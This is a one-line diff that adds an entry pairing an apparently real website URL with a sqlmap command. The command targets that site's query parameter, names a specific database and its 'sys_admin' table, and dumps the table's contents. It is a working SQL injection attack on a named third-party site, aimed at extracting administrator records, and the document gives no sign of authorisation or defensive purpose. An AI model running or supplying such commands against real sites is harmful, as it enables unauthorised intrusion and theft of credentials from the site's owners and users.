@@ -1,0 +1,1 @@
+http://www.cooperfenix.com.br/?artigo=2 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.cooperfenix.com.br/?artigo=2 -D cooperfe_webcontrol -T sys_admin --dump
